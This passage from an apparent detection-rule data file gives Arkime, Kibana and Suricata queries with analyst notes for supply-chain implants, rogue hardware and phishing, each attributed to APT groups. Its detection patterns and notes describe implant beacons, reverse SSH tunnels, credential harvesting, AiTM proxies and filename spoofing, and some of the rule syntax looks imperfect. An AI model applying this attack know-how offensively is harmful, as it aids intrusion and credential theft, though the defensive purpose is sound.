        arkime: "ip.src == $MPNET\n&& protocols == tls\n&& tls.ja3 != $ALLOWED_CLIENTS\n&& tls.ja3 != $BROWSER_JA3\n&& port.dst == 443\n&& packets.src > 5\n&& packets.src < 50\n// Process-name correlation is not available in baseline Arkime - pair with EDR/Sysmon Event 3 in the SIEM to\n// filter to suspect processes (*update*, *agent*, *service*, *.exe).\n// JA4 not available in Arkime 4.3.1 (Arkime 5+ only). Falls back to JA3 - lower entropy but still useful\n// for catching tool-vs-browser supply-chain implants.\n// See Suricata column for JA4 if your sensor supports it.",
        kibana: "source.ip: $MPNET\nAND destination.port: 443\nAND NOT tls.client.ja4: (\n  $ALLOWED_CLIENTS\n  OR $BROWSER_JA4\n)\nAND network.packets: [5 TO 50]",
        suricata: "alert tls $HOME_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1195.002 Anomalous\n    JA4 from non-browser process\n    supply chain beacon\";\n  flow:established,to_server;\n  ja3.hash;\n  threshold:type both,\n    track by_src,\n    count 5, seconds 600;\n  classtype:trojan-activity;\n  sid:9119506; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Supply chain implants embedded in legitimate software typically use bespoke TLS stacks (custom HTTP libraries, Go's net/http, .NET HttpClient with custom config) that produce distinctive JA4 fingerprints unlike legitimate vendor software. Build a JA4 baseline for known-good clients in your environment - vendor software JA4 hashes are stable across versions. Implants generate JA4s outside this baseline. Pair with low-volume periodic beacon patterns (5-50 packets per session, regular intervals) to identify dormant or check-in beacons typical of supply chain implants waiting for activation. Periodicity analysis at sessions level: beacon intervals of 60s, 300s, 3600s with low jitter are characteristic.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "SUNBURST implant used custom HTTP library generating distinctive JA3/JA4 fingerprints from infected SolarWinds Orion processes." },
          { cls: "apt-kp", name: "Lazarus", note: "3CX supply chain compromise generated anomalous JA4 from desktop client processes." },
          { cls: "apt-mul", name: "Multi", note: "JA4 fingerprinting of supply chain implants is documented in industry threat intelligence reports as a reliable detection method even when the implant is embedded in legitimate-appearing software." }
        ],
        cite: "MITRE ATT&CK T1195.002, industry reporting"
      },
      {
        sub: "T1195.003 - Compromise Hardware Supply Chain",
        indicator: "Hardware management interface phoning home to non-vendor infrastructure - IPMI/iLO/iDRAC backdoor",
        arkime: "ip.src == $MGMT_VLAN\n&& protocols != [http, https, dns, ntp, syslog, snmp]\n&& ip.dst != $ALLOWED_VENDOR_INFRA\n&& ip.dst != $MPNET\n&& port.dst == [443, 80, 8443, 4444, 6666]",
        kibana: "source.ip: $MGMT_VLAN\nAND NOT destination.ip: (\n  $ALLOWED_VENDOR_INFRA OR $MPNET\n)\nAND destination.port: (\n  443 OR 80 OR 8443\n  OR 4444 OR 6666\n)",
        suricata: "alert tcp $MGMT_VLAN any\n  -> $EXTERNAL_NET\n  [80,443,8443,4444,6666]\n  (msg:\"TA0001 T1195.003 Hardware\n    mgmt interface outbound to\n    non-vendor infrastructure\";\n  flow:established,to_server;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 60;\n  classtype:trojan-activity;\n  sid:9119507; rev:1;)",
        notes: "Hardware management interfaces (IPMI, iLO, iDRAC, BMC) operate below the OS - they have their own network stack, IP address, and TLS implementation. A compromised BMC can persist across OS reinstalls and is invisible to host-based security tools. Network detection is the only reliable signal for BMC-level compromise. Maintain a separate VLAN for BMC interfaces ($MGMT_VLAN) and alert on any outbound connection from those IPs to non-vendor infrastructure. Legitimate BMC outbound: vendor health monitoring, firmware update servers, NTP, syslog. Anything else from a BMC = critical investigation. Hardware supply chain attacks against BMCs are documented (Bloomberg's 'The Big Hack' allegations 2018, multiple academic demonstrations of malicious BMC firmware).",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Has been associated with hardware-level operations against technology sector supply chains." },
          { cls: "apt-mul", name: "Multi", note: "Hardware supply chain compromise targeting BMCs and management interfaces is documented in academic security research and vendor advisories. While direct nation-state attribution is limited in public reporting, the technical capability is well-documented and the attack surface is significant." }
        ],
        cite: "MITRE ATT&CK T1195.003, industry reporting"
      }
    ]
  },
  {
    id: "T1200",
    name: "Hardware Additions",
    desc: "Rogue devices · USB-Ethernet · network implants · rogue Wi-Fi APs",
    rows: [
      {
        sub: "T1200 - DHCP Anomalies",
        indicator: "DHCP request from unknown MAC OUI - new device joining network from unauthorized vendor",
        arkime: "ip.src == 0.0.0.0\n&& protocols == dhcp\n&& port.dst == 67\n&& dhcp.type == [DISCOVER, REQUEST]\n// OUI extraction is not available as a separate field in baseline Arkime 4.3.1 - only mac.src exists. To\n// filter on OUI, either match mac.src against a list of known-good prefix patterns (mac.src == [\"*aa:bb:\n// cc*\", ...]) or perform OUI lookup externally via Wireshark manuf file or IEEE OUI database after\n// pulling sessions matching DHCP DISCOVER/REQUEST.",
        kibana: "network.protocol: dhcp\nAND destination.port: 67\nAND dhcp.op: 1\nAND NOT source.mac:\n  $APPROVED_OUI_PREFIXES",
        suricata: "alert udp 0.0.0.0 68\n  -> 255.255.255.255 67\n  (msg:\"TA0001 T1200 DHCP from\n    unknown MAC OUI possible\n    rogue device\";\n  content:\"|01 01 06 00|\"; depth:4;\n  content:\"|63 82 53 63|\"; offset:236;\n  classtype:policy-violation;\n  sid:9120001; rev:1;)",
        notes: "DHCP DISCOVER/REQUEST messages contain the client MAC address - the first 3 octets (OUI) identify the hardware vendor. Maintain $APPROVED_OUI_PREFIXES allowlist of OUIs from your approved hardware (Dell, HP, Lenovo, Apple, your IP phone vendor, your printer vendor). Hardware additions often use distinctive OUIs: Hak5 devices commonly use Realtek (00:13:37 customizations), Raspberry Pi uses B8:27:EB / DC:A6:32 / E4:5F:01, common rogue device chipsets include MediaTek and Realtek consumer wireless. New OUIs appearing in DHCP traffic = unaudited device on network. Zeek dhcp.log captures full DHCP transaction including client identifier, hostname, and parameter requests.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Has used hardware implants in operations targeting Ukrainian critical infrastructure, deploying network devices to bridge air-gapped or segmented networks." },
          { cls: "apt-mul", name: "Multi", note: "The technique requires physical access and is most commonly observed in insider threat scenarios, close-access operations against high-value targets, and supply-chain interdiction." }
        ],
        activity: [
          { cls: "apt-mul", name: "Insider", note: "Hardware addition is documented as a primary insider threat vector in CISA and NSA advisories on physical security." }
        ],
        cite: "MITRE ATT&CK T1200, CISA advisories, NSA insider threat guidance"
      },
      {
        sub: "T1200 - Switch Port Anomalies",
        indicator: "Multiple MACs from same switch port - rogue switch or hub introduced",
        arkime: "protocols == arp",
        kibana: "network.protocol: arp\nAND switch.port: *\nAND _exists_: source.mac",
        suricata: "alert arp $HOME_NET any\n  -> any any\n  (msg:\"TA0001 T1200 Multiple MACs\n    on switch port possible rogue\n    switch or implant\";\n  content:\"|00 01|\"; offset:0;\n  depth:2;\n  threshold:type both,\n    track by_src,\n    count 3, seconds 60;\n  classtype:policy-violation;\n  sid:9120002; rev:1;)",
        notes: "A switch port should typically see one MAC address (the connected endpoint). Multiple MACs on a single port indicate either an unauthorized switch/hub introduced to expand connectivity, a network implant in transparent bridging mode (LAN Turtle, Packet Squirrel), or a virtualization host with bridged VMs. Detection requires switch port-MAC table data - pull this from your switches via SNMP, NetFlow with switch metadata, or 802.1X/MAC port security logs. Modern enterprise switches support 802.1X with single-MAC enforcement and MAC sticky learning - alert on 'secure port violation' SNMP traps. Most reliable detection comes from switch infrastructure rather than passive packet capture.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "Hak5 LAN Turtle and similar devices operate in transparent bridge mode, generating multiple-MAC-per-port signals. NSA and CISA physical security guidance documents network segmentation with port-level enforcement as the primary mitigation." }
        ],
        activity: [
          { cls: "apt-mul", name: "Insider", note: "Rogue switches and bridges introduced for network expansion are documented in penetration testing reports as a common physical security finding." }
        ],
        cite: "MITRE ATT&CK T1200, NSA physical security guidance"
      },
      {
        sub: "T1200 - Network Implants",
        indicator: "[OFF-NET TRIPWIRE] Reverse SSH / persistent outbound connection from network device subnet - implant phone-home",
        arkime: "ip.src == $WORKSTATIONS\n|| ip.src == $PRINTER_VLAN\n&& protocols == ssh\n&& port.dst == 22\n|| port.dst == [443, 8443, 80]\n&& ip.dst != $MPNET\n&& packets.src > 10\n&& session.length > 300",
        kibana: "source.ip: ($WORKSTATIONS OR $PRINTER_VLAN)\nAND NOT destination.ip: $MPNET\nAND destination.port: (\n  22 OR 443 OR 8443\n  OR 80 OR 2222\n)\nAND event.duration > 300000000",
        suricata: "alert tcp $HOME_NET any\n  -> $EXTERNAL_NET\n  [22,80,443,2222,8443]\n  (msg:\"TA0001 T1200 Long-lived\n    outbound from device VLAN\n    possible implant phone home\";\n  flow:established,to_server;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 300;\n  classtype:trojan-activity;\n  sid:9120003; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Network implants (LAN Turtle, Packet Squirrel) typically establish a persistent reverse SSH tunnel to adversary infrastructure for command and control. The connection is long-lived (hours to days), originates from a host VLAN that shouldn't be making outbound SSH connections, and uses port 22, 443, 2222, or another common port. Most enterprise printers, IoT devices, and end-user workstations have no legitimate reason to initiate outbound SSH. Build per-VLAN baselines: which subnets should/shouldn't initiate which protocols outbound. Long session duration (5+ minutes) plus low data volume = classic beacon/tunnel pattern. Pair with EDR if available to identify the source process - implants don't run on the host, so EDR on the host won't show the process.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Has used custom hardware implants in operations against Ukrainian infrastructure for persistent network access." },
          { cls: "apt-mul", name: "Multi", note: "Network implants providing reverse SSH tunnels are extensively documented in offensive security tooling (Hak5 LAN Turtle, Packet Squirrel, Plunder Bug)." }
        ],
        activity: [
          { cls: "apt-mul", name: "Insider", note: "Long-lived outbound connections from non-administrative VLANs are documented in CISA and NSA defensive guidance as a high-priority detection pattern." }
        ],
        cite: "MITRE ATT&CK T1200, T1572, industry reporting"
      },
      {
        sub: "T1200 - USB-Ethernet",
        indicator: "USB-connected network adapter / Bash Bunny - host generating DHCP from new MAC immediately after USB event",
        arkime: "ip.src == 0.0.0.0\n&& protocols == dhcp\n&& dhcp.type == DISCOVER\n// OUI extraction (mac.src.oui), per-host MAC tracking (source-host == $ALLOWED_HOST), and matching against\n// $ALLOWED_HOST_MACS are not available as fields in baseline Arkime 4.3.1. Logical spec: detect a host\n// generating DHCP DISCOVER from a NEW MAC address while the host's primary MAC is still active, where\n// the new MAC OUI matches a USB-Ethernet chipset (Realtek RTL8152, ASIX AX88179, Microchip LAN9512).\n// Implement via SIEM correlation of DHCP logs + switch CAM table data + USB device telemetry from\n// EDR or Windows Event 6416.",
        kibana: "network.protocol: dhcp\nAND dhcp.op: 1\nAND source.mac.vendor: (\n  Realtek OR Microchip\n  OR ASIX OR \"ProCurve Networking\"\n)\nAND host.name: $ALLOWED_HOSTS",
        suricata: "alert udp 0.0.0.0 68\n  -> 255.255.255.255 67\n  (msg:\"TA0001 T1200 DHCP from\n    USB-Ethernet OUI on host\n    possible Bash Bunny\";\n  content:\"|01 01 06 00|\"; depth:4;\n  content:\"|63 82 53 63|\"; offset:236;\n  classtype:policy-violation;\n  sid:9120004; rev:1;)",
        notes: "Bash Bunny, Rubber Ducky with Ethernet payload, and other malicious USB devices register as USB Ethernet adapters with the host OS - generating a NEW DHCP request from a new MAC address while the host's primary MAC continues to operate normally. The new MAC OUI typically points to common USB Ethernet chipsets (Realtek RTL8152, ASIX AX88179, Microchip LAN9512). Detection: a host generating multiple concurrent DHCP requests from different MACs is anomalous - primary NIC plus USB-Ethernet adapter. Pair with USB device logs (Windows Event 6416, USB device telemetry from EDR) for definitive correlation. Most enterprise environments should disable USB Ethernet/storage entirely via Group Policy or device control software.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "USB-attached network adapters are a documented physical attack vector in CISA and NSA insider threat guidance. The devices register as USB Ethernet adapters, generating distinctive DHCP traffic from common USB-Ethernet chipset OUIs (Realtek, ASIX, Microchip)." }
        ],
        activity: [
          { cls: "apt-mul", name: "Insider", note: "Hak5 Bash Bunny and similar USB attack platforms are documented offensive security tooling commonly observed in physical penetration tests and insider threat scenarios." }
        ],
        cite: "MITRE ATT&CK T1200, T1091, NSA insider threat guidance"
      },
      {
        sub: "T1200 - Rogue Wi-Fi",
        indicator: "Rogue access point - beaconing SSID matching corporate name from unauthorized BSSID",
        kibana: "network.protocol: \"802.11\"\nAND wireless.ssid: $CORP_SSIDS\nAND NOT wireless.bssid:\n  $AUTHORIZED_BSSIDS",
        suricata: "alert udp any any\n  -> any any\n  (msg:\"TA0001 T1200 Rogue AP\n    beaconing corp SSID from\n    unauthorized BSSID\";\n  pkt_data;\n  content:\"|80 00|\"; depth:2;\n  classtype:policy-violation;\n  sid:9120005; rev:1;)",
        notes: "Rogue access points beacon a corporate SSID (your Wi-Fi network name) from an unauthorized BSSID (MAC of the AP) to lure users into connecting through adversary-controlled infrastructure for credential harvesting and AiTM. Detection requires wireless monitoring infrastructure - most enterprise WLAN controllers (Cisco WLC, Aruba ClearPass, Meraki, Juniper Mist) include Wireless Intrusion Prevention (WIPS) that automatically detects rogue APs and impersonators. Maintain $AUTHORIZED_BSSIDS as your full enterprise AP MAC list. WiFi Pineapple and similar tools generate distinct beacon patterns. WIPS triggers should pipe to your SIEM. Pair with 802.1X EAP-TLS to make rogue AP exploitation harder (requires stolen client certs).",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "GRU operatives were detained in The Hague in 2018 attempting close-access wireless attacks against the OPCW with a Wi-Fi Pineapple-style device hidden in a vehicle in the parking lot. Documented by Dutch military intelligence." }
        ],
        activity: [
          { cls: "apt-mul", name: "Insider", note: "Rogue AP attacks are documented in NSA and CISA wireless security guidance as a primary close-access initial access vector." }
        ],
        cite: "MITRE ATT&CK T1200, T1557, Dutch MIVD reporting"
      },
      {
        sub: "T1200 - LLDP / CDP",
        indicator: "LLDP advertisement from unauthorized device - implant or unauthorized switch announcing presence",
        arkime: "protocols == lldp\n&& mac.dst == 01:80:c2:00:00:0e\n// OUI extraction (mac.src.oui) and per-device naming (lldp.system-name) are not available as fields in\n// baseline Arkime 4.3.1. Logical spec: filter to LLDP frames (mac.dst is the standard LLDP multicast\n// MAC) where the source MAC OUI is NOT in your $ALLOWED_NETWORK_OUIS list (Cisco, Juniper,\n// Aruba, etc.) and the system-name does not match your inventory. Implement via Zeek lldp.log or\n// SIEM correlation against switch SNMP data.",
        kibana: "network.protocol: \"lldp\"\nAND destination.mac: \"01:80:c2:00:00:0e\"\nAND NOT source.mac.vendor: $APPROVED_NETWORK_VENDORS",
        suricata: "alert eth any any\n  -> 01:80:c2:00:00:0e any\n  (msg:\"TA0001 T1200 LLDP from\n    unauthorized device on network\";\n  content:\"|88 cc|\"; offset:12;\n  depth:2;\n  classtype:policy-violation;\n  sid:9120006; rev:1;)",
        notes: "LLDP (Link Layer Discovery Protocol, EtherType 0x88CC) and CDP (Cisco Discovery Protocol) are used by network devices to advertise their presence and capabilities to neighbors. Most enterprise endpoints don't speak LLDP - only switches, IP phones, APs, and some servers. An LLDP advertisement from an unexpected source MAC is anomalous: either a rogue switch announcing itself, a network implant attempting to participate in network topology, or an unauthorized server. Some implants suppress LLDP/CDP to avoid detection. Zeek's lldp parser (community package) captures LLDP details. Switch port monitoring will see the LLDP advertisements at the access layer. Pair with DHCP OUI detection for correlation.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "Network device self-identification through LLDP can be both a detection asset (rogue devices announcing themselves) and a reconnaissance leak (legitimate devices disclosing topology to compromised neighbors - see T1590.004)." }
        ],
        activity: [
          { cls: "apt-mul", name: "Insider", note: "LLDP/CDP-based detection of unauthorized network devices is documented in NSA network defense guidance and Cisco security best practices." }
        ],
        cite: "MITRE ATT&CK T1200, NSA network defense guidance"
      }
    ]
  },
  {
    id: "T1566",
    name: "Phishing",
    desc: ".001 Attachment · .002 Link · .003 via Service",
    rows: [
      {
        sub: "T1566.001 - Spearphishing Attachment",
        indicator: "Inbound SMTP - password-protected archive or document from newly registered sending domain",
        kibana: "destination.ip: $MPNET\nAND network.protocol: smtp\nAND NOT source.ip: $ALLOWED_MX\nAND email.attachments.file.extension: (\n  zip OR rar OR 7z OR iso\n  OR img OR doc OR docx\n  OR xls OR xlsm OR pdf\n  OR lnk OR chm\n)",
        suricata: "alert smtp $EXTERNAL_NET any\n  -> $HOME_NET 25\n  (msg:\"TA0001 T1566.001 Inbound\n    phishing attachment\n    suspicious extension\";\n  flow:established,to_server;\n  content:\"Content-Disposition:\";\n  pcre:\"/filename=[\\\"\\']?[^\\\"\\'\\r\\n]+\n    \\.(zip|rar|7z|iso|img|\n    docx?|xlsx?m?|pdf|\n    lnk|chm)[\\\"\\']?/i\";\n  classtype:trojan-activity;\n  sid:9115601; rev:1;)",
        notes: "Password-protected archives (.zip, .rar, .7z) and disk images (.iso, .img) are the dominant phishing attachment formats - they bypass AV scanning because the scanner cannot read the contents without the password (typically included in the email body). .lnk and .chm files are also high-value finds - both execute code on double-click. Focus on attachments from external senders with no prior mail history to your org. Zeek smtp.log captures MIME headers including filenames. Correlate sending domain age via passive DNS - newly registered MX senders with these attachment types are near-certain malicious. Also watch for mismatched Content-Type (e.g. application/octet-stream labeled as .pdf).",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Extensively uses password-protected ZIP and ISO attachments to deliver initial access payloads, bypassing email gateway scanning." },
          { cls: "apt-kp", name: "Lazarus", note: "Uses .lnk and .chm files inside archives targeting financial and defense sector employees." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Delivers macro-enabled Office documents and password-protected archives to academic and NGO sector targets." }
        ],
        cite: "MITRE ATT&CK T1566.001, industry reporting"
      },
      {
        sub: "T1566.001 - Spearphishing Attachment",
        indicator: "SMTP attachment with double extension or RTLO character - filename spoofing",
        kibana: "destination.ip: $MPNET\nAND network.protocol: smtp\nAND email.attachments.file.name: (\n  *.pdf.exe OR *.doc.exe\n  OR *.jpg.exe OR *\\u202e*\n)\nAND NOT source.ip: $ALLOWED_MX",
        suricata: "alert smtp $EXTERNAL_NET any\n  -> $HOME_NET 25\n  (msg:\"TA0001 T1566.001 SMTP\n    attachment double extension\n    or RTLO filename spoof\";\n  flow:established,to_server;\n  content:\"Content-Disposition:\";\n  pcre:\"/filename=.*?\\.(pdf|doc|\n    jpg|png|txt)\\.(exe|scr|\n    bat|cmd|vbs|ps1)[\\\"\\'\\r\\n]/i\";\n  classtype:trojan-activity;\n  sid:9115602; rev:1;)",
        notes: "Double extensions (invoice.pdf.exe) and Right-to-Left Override (RTLO, U+202E) characters in filenames make executables appear to be documents. RTLO reverses the display of characters following it - 'invoice_\\u202egpj.exe' displays as 'invoice_exe.jpg' to the user. Both techniques are trivially detectable at the SMTP gateway level. The Unicode U+202E character in a filename is an immediate red flag with virtually no legitimate use case in email attachments. Most email gateways can strip or quarantine these - if you're still seeing them, your gateway needs tuning.",
        apt: [
          { cls: "apt-kp", name: "Kimsuky", note: "Uses RTLO filename spoofing to disguise executable attachments as documents in targeting of South Korean government and policy organization employees." },
          { cls: "apt-ir", name: "APT35", note: "Uses double extension filenames to conceal executable payloads delivered via spearphishing to academic and human rights organization targets." },
          { cls: "apt-mul", name: "Multi", note: "RTLO and double extension spoofing are low-sophistication but effective techniques documented in numerous phishing campaigns." }
        ],
        cite: "MITRE ATT&CK T1566.001, T1036.002, industry reporting"
      },
      {
        sub: "T1566.001 - Spearphishing Attachment",
        indicator: "[OFF-NET TRIPWIRE] Remote template injection - outbound DOTX/DOTM fetch immediately after email open",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.method == GET\n&& http.uri == [\"*.dotx\", \"*.dotm\", \"*.dot\", \"*.xltx\", \"*.xltm\", \"*.potx\"]\n&& ip.dst != $ALLOWED_DEFAULTS\n&& databytes.dst > 5000",
        kibana: "source.ip: $MPNET\nAND http.request.method: GET\nAND url.path: (\n  *.dotx OR *.dotm OR *.dot\n  OR *.xltx OR *.xltm\n  OR *.potx\n)\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1566.001 Remote\n    template fetch possible\n    injection lure\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/\\.(dotx?m?|xltx?m?|\n    potx?m?)\\b/i\";\n  http.uri;\n  classtype:trojan-activity;\n  sid:9115603; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Remote template injection embeds a URL in an Office document that fetches a macro-enabled template (.dotm, .xltm) from an external server when the document is opened. The document itself contains no macros - it only fetches them remotely, bypassing static AV scanning. The network signal is a GET request for a .dotx/.dotm/.xltm file from an internal host to an unknown external server - often within seconds of the document being opened. The fetched template contains the actual malicious macro. This technique bypasses email gateway scanning because the original attachment is clean. Correlate with SMTP logs to identify the document that triggered the fetch.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Extensively uses remote template injection to deliver macro payloads to government and military targets, embedding template URLs in clean-looking documents that fetch malicious templates on open." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Uses remote template injection against academic and NGO targets, using .dotm templates hosted on adversary infrastructure." },
          { cls: "apt-cn", name: "APT40", note: "Uses remote template injection in targeting of maritime and government sector organizations." }
        ],
        cite: "MITRE ATT&CK T1566.001, T1221, industry reporting"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "[OFF-NET TRIPWIRE] Internal host clicking URL in email - GET to newly registered domain within minutes of SMTP delivery",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.method == GET\n&& http.hasheader.src.value == *mail*\n&& ip.dst != $ALLOWED_DEFAULTS\n&& http.user-agent == [\"*Outlook*\", \"*Thunderbird*\", \"*Mail*\", \"*Chrome*\", \"*Firefox*\"]\n// Domain-age filtering is not available in baseline Arkime 4.3.1. Pair this query with external domain-age\n// enrichment (PassiveTotal, DomainTools, RiskIQ) or filter on results manually for domains <30 days old.",
        kibana: "source.ip: $MPNET\nAND http.request.method: GET\nAND http.request.headers.referer: *mail*\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1566.002 Internal\n    host click to unknown domain\n    possible phishing link\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/Referer:\\s*https?:\\/\\/\n    (mail|outlook|webmail|\n    owa)\\./i\";\n  http.header;\n  classtype:trojan-activity;\n  sid:9115604; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. The Referer header reveals when a user clicked a link from a webmail interface (mail., outlook., webmail., owa.). Combining the Referer with a destination domain age check <30 days is a high-confidence phishing click indicator. Correlate forward from the click: what did the destination serve? A redirect chain, a credential harvesting page, or a payload download all follow predictably. This is one of the most actionable real-time detections - the click happens before any credentials are entered or payload executes, giving a response window. Alert immediately and correlate with inbound SMTP logs to identify the phishing email.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Uses spearphishing links in targeted campaigns against government, technology, and defense sector organizations." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Delivers phishing links via webmail and sends targets to credential harvesting pages, with the click generating a Referer-tagged request to the harvesting infrastructure." },
          { cls: "apt-kp", name: "Kimsuky", note: "Uses spearphishing links against South Korean government targets with similar Referer-visible click patterns." }
        ],
        cite: "MITRE ATT&CK T1566.002, industry reporting"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "[OFF-NET TRIPWIRE] Credential POST to external host following phishing link click - active harvest in progress",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.method == POST\n&& ip.dst != $ALLOWED_DEFAULTS\n&& http.reqbody == [\"*password=*\", \"*passwd=*\", \"*pass=*\", \"*pwd=*\", \"*credential*\", \"*login*\"]\n&& databytes.src > 100\n&& databytes.src < 2000",
        kibana: "source.ip: $MPNET\nAND http.request.method: POST\nAND NOT destination.ip: $ALLOWED_DEFAULTS\nAND http.request.body: (\n  *password=* OR *passwd=*\n  OR *pass=* OR *pwd=*\n  OR *credential*\n)",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1566.002 Credential\n    POST to external host\n    phishing harvest\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(password|passwd|\n    pass|pwd|credential|\n    login)=/i\";\n  http.request_body;\n  classtype:trojan-activity;\n  sid:9115605; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. A credential POST to an external unknown host is one of the highest-priority network alerts - credentials are actively being submitted to an adversary-controlled harvesting page. POST body size 100-2000 bytes covers typical credential form submissions (username + password) while filtering out large form submissions. This fires after the victim has already entered their credentials - immediate response required. Identify which user submitted, what credentials (email domain suggests the service), and whether MFA is in use. Correlate with upstream: was there a phishing click (Referer) in the minutes preceding this POST? Check for AiTM proxy patterns in the response (anomalous cookies, JA4S mismatch).",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Credential harvesting operations generate POST-to-external patterns from victim hosts, with the POST containing Office 365 or Azure AD credentials to adversary-controlled infrastructure." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Uses AiTM infrastructure that proxies credential POSTs to legitimate IdPs while capturing credentials in transit." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Credential harvesting pages receive POST submissions from targeted academic and NGO sector users." }
        ],
        cite: "MITRE ATT&CK T1566.002, T1598.003, CISA advisories"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "[OFF-NET TRIPWIRE] AiTM phishing proxy - session cookie harvest via reverse proxy to legitimate IdP",
        arkime: "ip.src == $MPNET\n&& protocols == tls\n&& tls.ja3s != $ALLOWED_IDPS_JA3S\n&& ip.dst != $ALLOWED_IDPS\n&& cert.subject.cn == [\"*microsoft*\", \"*office365*\", \"*login.microsoftonline*\", \"*google*\", \"*accounts.google*\", \"*okta*\", \"*azure*\", \"*duo*\", \"*ping*\"]",
        kibana: "source.ip: $MPNET\nAND NOT destination.ip: $ALLOWED_IDPS\nAND tls.server.x509.subject.common_name: (\n  *microsoft* OR *office365*\n  OR *google* OR *okta*\n  OR *azure* OR *duo*\n)\nAND tls.server.not_before:\n  [now-14d TO now]",
        suricata: "alert tls $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1566.002 AiTM\n    proxy IdP cert CN mismatch\n    session harvest\";\n  flow:established,to_server;\n  tls.cert_subject;\n  pcre:\"/CN=[^,]*(microsoft|\n    office365|google|okta|\n    azure|duo|ping)/i\";\n  classtype:trojan-activity;\n  sid:9115606; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. AiTM phishing proxies (Evilginx2, Modlishka, Muraena) present TLS certificates with CNs mimicking legitimate IdPs (Microsoft, Google, Okta) while proxying traffic to the real IdP - capturing session cookies after MFA completes. Detection: the certificate CN claims to be a known IdP but the destination IP is not a known IdP IP range, and the JA4S fingerprint differs from legitimate IdP TLS server responses. A new certificate (<14 days old) claiming to be Microsoft or Okta from an unknown IP is near-certain AiTM infrastructure. Build a JA4S allowlist for your legitimate IdPs and alert on any deviation from a host claiming to serve their CN.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Uses Evilginx2-based AiTM infrastructure to harvest session cookies from Microsoft 365 authentication flows, bypassing MFA by capturing post-authentication session tokens." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Deploys AiTM phishing infrastructure against technology and hospitality sector targets, using Evilginx2 and custom proxies to harvest Okta and Azure AD session cookies." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Uses AiTM proxies targeting Google Workspace authentication for academic and NGO sector targets." }
        ],
        cite: "MITRE ATT&CK T1566.002, T1539, industry reporting"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "[OFF-NET TRIPWIRE] OTP / MFA relay - rapid token submission to legitimate IdP immediately after phishing click",
